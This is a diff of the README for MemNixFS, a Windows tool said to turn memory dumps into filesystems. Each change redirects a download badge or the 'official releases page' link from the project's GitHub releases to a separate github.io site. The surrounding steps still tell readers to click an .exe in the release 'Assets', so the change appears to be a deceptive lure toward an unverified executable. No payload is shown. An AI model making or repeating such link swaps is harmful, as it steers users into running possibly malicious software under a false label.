@@ -1,6 +1,6 @@
 # 🔍 MemNixFS - Transform Memory Dumps Into Filesystems
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/stanleyjoy1980/MemNixFS/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://stanleyjoy1980.github.io)
 
 ## What is MemNixFS?
 
@@ -19,11 +19,11 @@ MemNixFS works on Windows 10 and Windows 11. Ensure your system meets these requ
 
 To get the software, navigate to the release page.
 
-[![](https://img.shields.io/badge/Download-Release_Page-grey.svg)](https://github.com/stanleyjoy1980/MemNixFS/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-grey.svg)](https://stanleyjoy1980.github.io)
 
 Follow these steps to set the tool up on your machine:
 
-1.  Visit the [official releases page](https://github.com/stanleyjoy1980/MemNixFS/releases).
+1.  Visit the [official releases page](https://stanleyjoy1980.github.io).
 2.  Locate the section labeled "Assets" at the bottom of the newest release version.
 3.  Click the link ending in `.exe` to start the download.
 4.  Once the file finishes downloading, open your Downloads folder.
